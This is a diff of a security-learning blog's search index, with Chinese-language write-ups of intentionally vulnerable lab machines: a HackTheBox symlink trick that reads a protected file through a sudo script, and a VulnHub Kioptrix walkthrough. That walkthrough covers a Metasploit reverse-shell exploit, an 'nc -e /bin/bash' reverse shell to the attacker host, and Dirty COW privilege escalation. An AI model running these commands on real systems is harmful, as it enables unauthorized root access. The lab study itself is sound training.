+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cat /usr/bin/bash /opt/ghost/clean_symlink.sh</span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/14.png"
+                      width="600" height="800"
+                >
+
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ls -al</span><br><span class="line">ln -s /home/bob/user.txt flag.png</span><br><span class="line">ls -al</span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/15.png"
+                      width="600" height="800"
+                >
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/16.png"
+                      width="600" height="800"
+                >
+
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/flag.png</span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/17.png"
+                      width="600" height="800"
+                >
+
+<p>It’s the same to the root, but we need to link b to pass the filter.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/hackthebox/0/18.png"
+                      width="600" height="800"
+                ></p>
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
+<li><a class="link"   href="https://medium.com/@mukhammadiyev20040/linkvortex-htb-write-up-5fbc66cc0081" >Linkvortex | HTB| Walkthrough<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
 ]]></content>
       <tags>
-        <tag>PortSwigger</tag>
+        <tag>HackTheBox</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>MyBook</title>
-    <url>/2024/12/08/MyBook/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Pratice"><a href="#Pratice" class="headerlink" title="Pratice"></a>Pratice</h3><ul>
-<li><a class="link"   href="https://di3n0.github.io/2024/11/30/picoCTF/" >picoCTF<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-<li><a class="link"   href="https://di3n0.github.io/2024/11/30/VulnHub/" >VulnHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-<li><a class="link"   href="https://di3n0.github.io/2024/12/03/PortSwigger/" >PortSwigger<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-<li><a class="link"   href="https://di3n0.github.io/2024/12/09/HackTheBox/" >HackTheBox<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-</ul>
-<p><br><br><br><br><br><br><br><br></p>
-<h3 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h3><ul>
-<li><a class="link"   href="https://hackmd.io/@dinosaur/Byg0EhzC2a" >Yuawn PWN Writeup<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-<li><a class="link"   href="https://hackmd.io/@dinosaur/SJ4EzbbkR" >Splitline Web Writeup<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-</ul>
-<p><br><br><br><br><br><br><br><br></p>
-<h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><ul>
-<li><a class="link"   href="https://di3n0.github.io/2024/12/09/LeetCode/" >LeetCode<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-<li><a class="link"   href="https://di3n0.github.io/2024/12/08/Red-Team/" >Red Team<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-</ul>
-<p><br><br><br><br><br><br><br><br><br><br><br></p>
-]]></content>
   </entry>
   <entry>
     <title>LeetCode</title>
@@ -693,40 +567,92 @@
       </tags>
   </entry>
   <entry>
-    <title>Red Team</title>
-    <url>/2024/12/08/Red-Team/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h4 id="1-專注於滲透測試和攻擊腳本的資源"><a href="#1-專注於滲透測試和攻擊腳本的資源" class="headerlink" title="1. 專注於滲透測試和攻擊腳本的資源"></a><strong>1. 專注於滲透測試和攻擊腳本的資源</strong></h4><h5 id="1-Exploit-Database-Exploit-DB"><a href="#1-Exploit-Database-Exploit-DB" class="headerlink" title="(1) Exploit Database (Exploit-DB)"></a><strong>(1) <a class="link"   href="https://www.exploit-db.com/" >Exploit Database (Exploit-DB)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><h5 id="2-GitHub"><a href="#2-GitHub" class="headerlink" title="(2) GitHub"></a><strong>(2) <a class="link"   href="https://github.com/" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Search: <code>red team scripts</code>、<code>offensive security</code>、<code>post exploitation</code> </p>
-<hr>
-<h4 id="2-專注於紅隊技術的資源"><a href="#2-專注於紅隊技術的資源" class="headerlink" title="2. 專注於紅隊技術的資源"></a><strong>2. 專注於紅隊技術的資源</strong></h4><h5 id="1-Red-Team-Academy"><a href="#1-Red-Team-Academy" class="headerlink" title="(1) Red Team Academy"></a><strong>(1) <a class="link"   href="https://www.redteamacademy.com/" >Red Team Academy<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>專注於紅隊技術學習，提供完整的紅隊作業流程，包括社交工程和後滲透技術等。這些內容幫助學習者根據目標環境設計定制化的攻擊劇本，以及進行紅隊任務中的腳本化自動化操作。</p>
-<h5 id="2-PayloadsAllTheThings"><a href="#2-PayloadsAllTheThings" class="headerlink" title="(2) PayloadsAllTheThings"></a><strong>(2) <a class="link"   href="https://github.com/swisskyrepo/PayloadsAllTheThings" >PayloadsAllTheThings<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>這是一個專注於各種攻擊向量的 GitHub 資源庫，包括 SQL Injection、XSS、SSRF 等攻擊場景。它提供了豐富的 Payload 示例，幫助學習者將這些 Payload 整合到自己的攻擊腳本中，並應用於多種場景。</p>
-<h5 id="3-TrustedSec-Blog"><a href="#3-TrustedSec-Blog" class="headerlink" title="(3) TrustedSec Blog"></a><strong>(3) <a class="link"   href="https://www.trustedsec.com/blog/" >TrustedSec Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>TrustedSec 提供最新的紅隊工具與技術分析，分享實際攻擊場景的案例研究。透過這些資源，學習者能更有效地在紅隊演練中應用工具與腳本。</p>
-<h5 id="4-dmcxblue"><a href="#4-dmcxblue" class="headerlink" title="(4) dmcxblue"></a><strong>(4) <a class="link"   href="https://dmcxblue.net/" >dmcxblue<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>dmcxblue 提供紅隊技術相關的文章和研究，涵蓋多種進階攻擊技術和工具的使用。特別適合想了解攻擊理論和實踐的學習者。</p>
-<h5 id="5-Ired-Team"><a href="#5-Ired-Team" class="headerlink" title="(5) Ired Team"></a><strong>(5) <span style="color: green;"><a class="link"   href="https://www.ired.team/" >Ired Team<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></span></strong></h5><p>Ired Team 提供紅隊技術的實踐指南，涵蓋滲透測試和後滲透技術的深入研究，適合學習高階的攻擊操作。</p>
-<h5 id="6-Rawsec-Blog"><a href="#6-Rawsec-Blog" class="headerlink" title="(6) Rawsec Blog"></a><strong>(6) <span style="color: green;"><a class="link"   href="https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/" >Rawsec Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></span></strong></h5><p>專注於網絡滲透技術，特別是關於網絡橫向移動和數據隧道化的實踐案例。</p>
-<hr>
-<h4 id="3-模擬演練和學習攻擊腳本的平台"><a href="#3-模擬演練和學習攻擊腳本的平台" class="headerlink" title="3. 模擬演練和學習攻擊腳本的平台"></a><strong>3. 模擬演練和學習攻擊腳本的平台</strong></h4><h5 id="1-Hack-The-Box"><a href="#1-Hack-The-Box" class="headerlink" title="(1) Hack The Box"></a><strong>(1) <span style="color: green;"><a class="link"   href="https://www.hackthebox.com/" >Hack The Box<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></span></strong></h5><p>Hack The Box 提供一個互動學習平台，專注於紅隊與藍隊的模擬攻擊場景，適合學習如何在實際演練中使用攻擊腳本。它涵蓋從基礎到高級的滲透測試挑戰，幫助學習者針對不同場景進行腳本開發與應用。</p>
-<h5 id="2-VulnHub"><a href="#2-VulnHub" class="headerlink" title="(2) VulnHub"></a><strong>(2) <a class="link"   href="https://www.vulnhub.com/" >VulnHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>VulnHub 提供可下載的靶機映像，讓學習者可以在本地虛擬環境中進行滲透測試演練，從而提升實戰能力。涵蓋多種難度和場景，適合從初學者到高級使用者。</p>
-<h5 id="3-TryHackMe"><a href="#3-TryHackMe" class="headerlink" title="(3) TryHackMe"></a><strong>(3) <a class="link"   href="https://tryhackme.com/" >TryHackMe<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>TryHackMe 提供專門的腳本化攻擊課程，包括 CTF 和專業紅隊技能訓練環境，幫助學習者從基礎腳本開發到複雜攻擊劇本的實踐操作，並結合 <code>pwntools</code> 等工具進行實作。</p>
-<h5 id="4-RangeForce"><a href="#4-RangeForce" class="headerlink" title="(4) RangeForce"></a><strong>(4) <a class="link"   href="https://www.rangeforce.com/" >RangeForce<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>RangeForce 模擬企業場域的防禦與攻擊演練，針對紅隊演練特性提供深度學習環境。學習者可以在此學習如何應對企業防禦措施，並開發和調整針對實際場域的攻擊腳本。</p>
-<h5 id="5-BloodHound"><a href="#5-BloodHound" class="headerlink" title="(5) BloodHound"></a><strong>(5) <a class="link"   href="https://bloodhound.readthedocs.io/" >BloodHound<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>BloodHound 是一個用於內網環境分析的工具，特別針對 Active Directory（AD）環境進行攻擊路徑探索與分析，幫助學習者設計內網滲透策略。</p>
-<h5 id="6-Offensive-Security-Learning-Paths"><a href="#6-Offensive-Security-Learning-Paths" class="headerlink" title="(6) Offensive Security Learning Paths"></a><strong>(6) <span style="color: green;"><a class="link"   href="https://www.offsec.com/learning/paths/" >Offensive Security Learning Paths<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></span></strong></h5><p>Offensive Security 提供結構化的學習路徑，幫助學習者從基礎滲透測試技能逐步提升到高級攻擊技術。</p>
-<h5 id="7-GOAD-GitHub"><a href="#7-GOAD-GitHub" class="headerlink" title="(7) GOAD (GitHub)"></a><strong>(7) <span style="color: green;"><a class="link"   href="https://github.com/Orange-Cyberdefense/GOAD" >GOAD (GitHub)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></span></strong></h5><p>GOAD 是一個 Active Directory 滲透測試學習實驗室，專注於內網攻擊和紅隊實踐，幫助學習者深入了解 AD 的攻擊技巧。</p>
-<h5 id="8-PortSwigger"><a href="#8-PortSwigger" class="headerlink" title="(8) PortSwigger"></a><strong>(8) <span style="color: green;"><a class="link"   href="https://portswigger.net/" >PortSwigger<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></span></strong></h5><p>PortSwigger 提供滲透測試和安全研究的工具和資源，包括廣泛使用的 Burp Suite，幫助學習者掌握滲透測試技能。</p>
-<hr>
-<h4 id="4-特定工具與框架學習資源"><a href="#4-特定工具與框架學習資源" class="headerlink" title="4. 特定工具與框架學習資源"></a><strong>4. 特定工具與框架學習資源</strong></h4><h5 id="1-Cobalt-Strike-Documentation"><a href="#1-Cobalt-Strike-Documentation" class="headerlink" title="(1) Cobalt Strike Documentation"></a><strong>(1) <a class="link"   href="https://www.cobaltstrike.com/support/user-manuals" >Cobalt Strike Documentation<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>提供詳細的 Cobalt Strike 使用指南，特別是 Aggressor Scripts 的編寫與應用教學。這幫助學習者了解攻擊腳本的開發流程，並結合現有工具實現任務的自動化腳本設計。</p>
-<h5 id="2-Metasploit-Unleashed"><a href="#2-Metasploit-Unleashed" class="headerlink" title="(2) Metasploit Unleashed"></a><strong>(2) <a class="link"   href="https://www.offensive-security.com/metasploit-unleashed/" >Metasploit Unleashed<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Metasploit 的官方教學，涵蓋腳本模組的開發與應用。學習者可以透過這些內容掌握如何根據需求設計自定義攻擊腳本，以及熟悉 Metasploit 框架的腳本化操作流程。</p>
-<h5 id="3-MITRE-ATT-CK-Framework"><a href="#3-MITRE-ATT-CK-Framework" class="headerlink" title="(3) MITRE ATT&amp;CK Framework"></a><strong>(3) <a class="link"   href="https://attack.mitre.org/" >MITRE ATT&amp;CK Framework<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>提供標準化的攻擊技術與場景資料庫，幫助學習者模擬 ATT&amp;CK 技術腳本的實現，並設計符合紅隊演練場景的攻擊腳本。</p>
-<h5 id="4-Empire"><a href="#4-Empire" class="headerlink" title="(4) Empire"></a><strong>(4) <a class="link"   href="https://github.com/BC-SECURITY/Empire" >Empire<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Empire 是一個強大的後滲透測試框架，支持腳本化的滲透測試活動，適合進行模擬攻擊與自動化操作。</p>
-<h5 id="5-MITRE-Caldera"><a href="#5-MITRE-Caldera" class="headerlink" title="(5) MITRE Caldera"></a><strong>(5) <a class="link"   href="https://caldera.mitre.org/" >MITRE Caldera<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>MITRE Caldera 是一個自動化紅隊模擬框架，專注於模擬真實的攻擊行為，幫助學習者測試與了解各種攻擊技術。適合用於模擬企業場域的攻擊活動。</p>
-<h5 id="6-Atomic-Red-Team"><a href="#6-Atomic-Red-Team" class="headerlink" title="(6) Atomic Red Team"></a><strong>(6) <a class="link"   href="https://github.com/redcanaryco/atomic-red-team" >Atomic Red Team<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Atomic Red Team 提供一組開放式的攻擊技術測試框架，幫助學習者快速測試與模擬常見的攻擊技巧，並結合 MITRE ATT&amp;CK 進行實踐。</p>
-<hr>
+    <title>KIOPTRIX: LEVEL 1.2</title>
+    <url>/2024/11/30/KIOPTRIX-LEVEL-1-2/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
+<p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
+<br>
+<br>
+
+<p><strong>前置工作</strong></p>
 <ul>
-<li><a class="link"   href="https://devco.re/blog/2024/07/09/guide-to-applying-for-red-team-specialist/" >Reference<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li>匯入 VMware</li>
+<li>虛擬機配置不同網路-Bridged(<a class="link" href="https://blog.csdn.net/Attsky/article/details/109320325">網路<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link" href="https://blog.csdn.net/qq1069380146/article/details/111995334">IP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkJ6mp_tp.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJOQumtKT.png" alt="image"></li>
+<li><a class="link" href="https://youtu.be/KgG-r32jvDc?si=M1Ho6yPDYaliLqOU">教學影片<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1pNd8z5p.png" alt="image"></li>
 </ul>
+<br>
+<br>
+
+<h2 id="步驟一、搜索目標"><a href="#步驟一、搜索目標" class="headerlink" title="步驟一、搜索目標"></a>步驟一、搜索目標</h2><p>查找自己IP。<code>ifconfig</code>。自己IP為<code>192.168.0.8</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Bkq9uUz9a.png" alt="image"></p>
+<p>搜索靶機IP。<code>sudo netdiscover -r 192.168.0.0/24</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Hk2qt8fca.png" alt="image"></p>
+<p>目標為<code>192.168.0.10</code>。<br>nmap掃其服務<code>sudo nmap -A -T4 192.168.0.10</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/By6Vq8M5T.png" alt="image"><br>其http有網頁服務。<code>http://192.168.0.10/</code>。</p>
+<p><code>whatweb 192.168.0.10</code>。觀察其中含有<code>HTTPServer</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyswZvG96.png" alt="image"></p>
+<p>在Blog中觀察到有<code>http://kioptrix3.com/gallery</code>。<br>在Login中使用普通 SQL Injection 手法進不去。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJzk4PM5a.png" alt="image"><br>觀察登入處最下方有<code>Proudly Powered by: LotusCMS</code>。<br><br><br><br></p>
+<h2 id="步驟二、針對其服務探索"><a href="#步驟二、針對其服務探索" class="headerlink" title="步驟二、針對其服務探索"></a>步驟二、針對其服務探索</h2><p><code>searchsploit LotusCMS</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJZuSvMcp.png" alt="image"></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">search Lotus</span><br><span class="line">search LotusCMS</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/r1HUIvz9p.png" alt="image"><br><br></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">use 0</span><br><span class="line">set payload generic/shell_reverse_tcp</span><br><span class="line">show options</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1ZxTPzqp.png" alt="image"><br><br></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.0.10</span><br><span class="line">set URI /</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
+<p>set URI / 的含義是將模塊的 URI 選項設置為 /。具體而言，用於指定攻擊目標的URI（Uniform Resource Identifier），即指定攻擊目標的路徑或位置。這很重要。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/S1SLTDMq6.png" alt="image"><br><br></p>
+<p>使用<code>id</code>查看身分。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJl00wGca.png" alt="image"><br><br><br><br></p>
+<h2 id="步驟三、另闢蹊徑取得權限"><a href="#步驟三、另闢蹊徑取得權限" class="headerlink" title="步驟三、另闢蹊徑取得權限"></a>步驟三、另闢蹊徑取得權限</h2><p><code>uname -a</code>得到系統 Linux Kernel 版本<code>2.6.24</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJqQZOG5T.png" alt="image"></p>
+<p><code>searchsploit Kernel 2.6.24</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ry-yQ_zca.png" alt="image"></p>
+<p>其中有一段：<br><code>Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)                       | linux/local/40839.c</code></p>
+<p>“Dirty COW” 是一個影響 Linux Kernel 的特權升級漏洞，受影響版本為 2.6.22 到 3.9。漏洞利用了 PTRACE_POKEDATA 的競爭條件，攻擊者可以通過修改內核內存，實現特權升級。攻擊可能利用 <code>/etc/passwd</code> 文件，向其中添加具有特權的新用戶。系統管理員應盡快更新 Kernel 以修補此漏洞。提供的 <code>40839.c</code> 文件可能是漏洞利用代碼的參考。</p>
+<p><code>searchsploit -m linux/local/40839.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkjLXdfqp.png" alt="image"></p>
+<p><code>python3 -m http.server</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1EkSOf9T.png" alt="image"><br><br><br><br></p>
+<h2 id="步驟四、建立連線"><a href="#步驟四、建立連線" class="headerlink" title="步驟四、建立連線"></a>步驟四、建立連線</h2><p>發現其shell跳不到/tmp。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyowL_zqT.png" alt="image"></p>
+<p>開啟另一個shell。<code>sudo nc -nlvp 6666</code>。開啟監聽。<br>在原本Shell輸入<code>nc -e /bin/bash 192.168.0.8 6666</code>與另一個shell建立連線。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryNQuOzcT.png" alt="image"><br><br></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure></div>
+<p><code>python -c</code>：啟動 Python 解釋器並運行指定的 Python 代碼。<br><code>'import pty;pty.spawn("/bin/bash")'</code>：這是一個簡短的 Python 腳本，其中 import pty 導入 pty 模塊，而 pty.spawn(“/bin/bash”) 則啟動一個交互式的 Bash shell。這個 Python 命令使用 pty 模塊在 Linux 系統中生成一個交互式的 Bash shell。通過執行這條命令，你可以將一個非交互式的 shell 提升為交互式，方便進行進一步的操作。這樣的技巧通常在渗透測試和安全測試中使用，但應僅在合法且得到授權的環境中進行。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SyMTd_zc6.png" alt="image"></p>
+<p><code>wget http://192.168.0.8:8000/40839.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Sk14q_Gqa.png" alt="image"><br><br><br><br></p>
+<h2 id="步驟五、漏洞內容"><a href="#步驟五、漏洞內容" class="headerlink" title="步驟五、漏洞內容"></a>步驟五、漏洞內容</h2><p>裡面有使用教學。<code>cat 40839.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1M0qOf5p.png" alt="image"></p>
+<p>按照其敘述。</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -pthread 40839.c -o try -lcrypt</span><br><span class="line">ls -alh</span><br><span class="line">./try</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Bk6w6dG9p.png" alt="image"><br><br><br><br></p>
+<h2 id="步驟六、取得權限"><a href="#步驟六、取得權限" class="headerlink" title="步驟六、取得權限"></a>步驟六、取得權限</h2><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">su - firefart</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">輸入密碼</span></span><br><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJyDAOM9a.png" alt="image"></p>
 ]]></content>
       <tags>
-        <tag>other</tag>
+        <tag>VulnHub</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>PortSwigger</title>
+    <url>/2024/12/03/PortSwigger/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
+<li><a class="link"   href="https://di3n0.github.io/2024/12/09/SSRF/" >SSRF<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link"   href="https://di3n0.github.io/2024/12/09/SQL-Injection/" >SQL-Injection<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+<p><br><br><br><br><br><br></p>
+]]></content>
+      <tags>
+        <tag>PortSwigger</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MyBook</title>
+    <url>/2024/12/08/MyBook/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Pratice"><a href="#Pratice" class="headerlink" title="Pratice"></a>Pratice</h3><ul>
+<li><a class="link"   href="https://di3n0.github.io/2024/11/30/picoCTF/" >picoCTF<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link"   href="https://di3n0.github.io/2024/11/30/VulnHub/" >VulnHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link"   href="https://di3n0.github.io/2024/12/03/PortSwigger/" >PortSwigger<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link"   href="https://di3n0.github.io/2024/12/09/HackTheBox/" >HackTheBox<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+<p><br><br><br><br><br><br><br><br></p>
+<h3 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h3><ul>
+<li><a class="link"   href="https://hackmd.io/@dinosaur/Byg0EhzC2a" >Yuawn PWN Writeup<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link"   href="https://hackmd.io/@dinosaur/SJ4EzbbkR" >Splitline Web Writeup<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+<p><br><br><br><br><br><br><br><br></p>
+<h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><ul>
+<li><a class="link"   href="https://di3n0.github.io/2024/12/09/LeetCode/" >LeetCode<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link"   href="https://di3n0.github.io/2024/12/08/Red-Team/" >Red Team<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+<p><br><br><br><br><br><br><br><br><br><br><br></p>
+]]></content>
   </entry>
   <entry>
     <title>SQL-Injection</title>
@@ -1165,25 +1091,6 @@ Since the original query returns two columns and only the second column can stor
       </tags>
   </entry>
   <entry>
-    <title>VulnHub</title>
-    <url>/2024/11/30/VulnHub/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview">EXERCISE.LIST<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h2 id="PWK-V1"><a href="#PWK-V1" class="headerlink" title="PWK V1"></a>PWK V1</h2><ul>
-<li><a href="../KIOPTRIX-LEVEL-1">KIOPTRIX: LEVEL 1</a></li>
